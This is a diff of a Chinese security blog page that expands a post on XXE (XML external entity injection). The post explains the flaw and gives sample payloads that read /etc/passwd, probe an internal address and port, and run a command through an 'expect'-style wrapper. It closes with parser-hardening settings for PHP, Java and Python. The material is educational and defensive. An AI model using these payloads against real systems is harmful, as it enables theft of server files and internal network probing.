@@ -394,14 +394,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-07-09
+                    2023-07-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    157
+                    372
                 </div>
                 
 
@@ -430,7 +430,50 @@
             <div id="articleContent">
                 <h4 id="了解XML"><a href="#了解XML" class="headerlink" title="了解XML"></a>了解XML</h4><p>XML 是一种标记语言，很类似于 HTML<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息<br>因此我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p>
 <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>XXE是针对解析XML输入的应用程序的一种攻击。<br>当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。</p>
-<h4 id="危"><a href="#危" class="headerlink" title="危"></a>危</h4><p>这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
+<h4 id="常见漏洞存在点"><a href="#常见漏洞存在点" class="headerlink" title="常见漏洞存在点"></a>常见漏洞存在点</h4><p>可解析xml的api接口</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li>内网端口扫描</li>
+<li>利用file协议等读取文件</li>
+<li>攻击内网web应用使用</li>
+<li>get(struts2等)</li>
+</ol>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol>
+<li>导致可以加载恶意外部文件</li>
+<li>造成文件读取（信息泄露、SSRF）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+</li>
+<li>内网端口扫描<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+ &lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.124:4444/test&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;
+</code></pre>
+</li>
+<li>攻击内网网站（命令执行）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+ &lt;!ENTITY xxe SYSTEM &quot;except://id&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+</li>
+<li>发起dos攻击等危害（拒绝服务）</li>
+</ol>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol>
+<li>过滤用户提交的XML数据</li>
+<li>将PHP程序的libxml_disable_entity_loader设置为TRUE来禁用外部实体</li>
+<li>java如下更改配置<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+</code></pre>
+</li>
+<li>python如下配置<pre><code>from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code></pre>
+</li>
+</ol>
 
                 
             </div>
@@ -525,18 +568,17 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="">
+                <a href="../../10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="../../../../medias/featureimages/15.jpg" class="responsive-img" alt="XXE（XML外部实体注入）">
+                        <img src="../../../../medias/featureimages/21.jpg" class="responsive-img" alt="邮件系统漏洞攻击">
                         
-                        <span class="card-title">XXE（XML外部实体注入）</span>
+                        <span class="card-title">邮件系统漏洞攻击</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -546,18 +588,21 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-09
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-10
+                        </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            liuGuobin
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="../../../../categories/%E6%97%A5%E6%8A%A5/" class="post-category">
+                                    日报
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -732,7 +777,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">94.9k</span>
+                        class="white-color">97.7k</span>
             
             
             
